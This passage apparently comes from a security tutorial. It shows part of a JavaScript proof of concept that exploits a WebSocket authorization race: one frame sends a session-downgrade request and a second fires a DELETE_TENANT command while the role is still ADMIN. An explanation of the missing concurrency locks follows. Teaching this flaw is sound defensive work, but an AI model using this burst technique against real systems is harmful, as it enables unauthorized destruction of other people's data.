        // access is revoked, or they want to test the Race Condition directly.
        // The attacker crafts a burst payload: Frame 1 immediately downgrades the session. 
        // Frame 2 executes the administrative action.

        // Frame 1: Downgrade the session to GUEST (Requires ~50ms DB lookup to verify token is invalid)
        ws.send(JSON.stringify({ action: 'AUTH', token: 'INVALID_OR_GUEST_TOKEN' }));
        
        // Frame 2: Destructive Action (Fired 1ms later)
        // Because Frame 1 is awaiting the DB lookup, `ws.userRole` is still 'ADMIN'.
        ws.send(JSON.stringify({ action: 'DELETE_TENANT', tenantId: '9918' }));

        // 4. The backend evaluates Frame 2 instantly, reading the stale 'ADMIN' state.
        // 5. The backend begins the deletion process.
        // 6. 49ms later, Frame 1 finishes the DB lookup and sets `ws.userRole = 'GUEST'`.
        // 7. The damage is already done.
    }, 1000);
};
```
{% endstep %}

{% step %}
To minimize network overhead and maximize interactive responsiveness, platform engineers designed a stateful, asynchronous WebSocket ingestion pipeline. This architecture bound user authorization context directly to the persistent socket memory reference, updating it dynamically as authentication events arrived. The security failure stemmed from a profound misunderstanding of full-duplex concurrency mechanics within single-threaded event loops (Node.js) or Task schedulers (C#). Developers assumed that message frames were processed with strict chronological atomicity. By omitting critical section locks (Mutexes) around the socket's state object, they exposed the authorization matrix to temporal desynchronization. The attacker exploited this by orchestrating an interleaved burst of network frames. By forcing a state-mutating command requiring database I/O to execute milliseconds prior to a highly privileged destructive command, the attacker forced the execution environments to overlap. The application evaluated the authorization of the destructive payload against the stale, elevated memory state, completely nullifying the platform's dynamic privilege enforcement capabilities through raw asynchronous manipulation
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
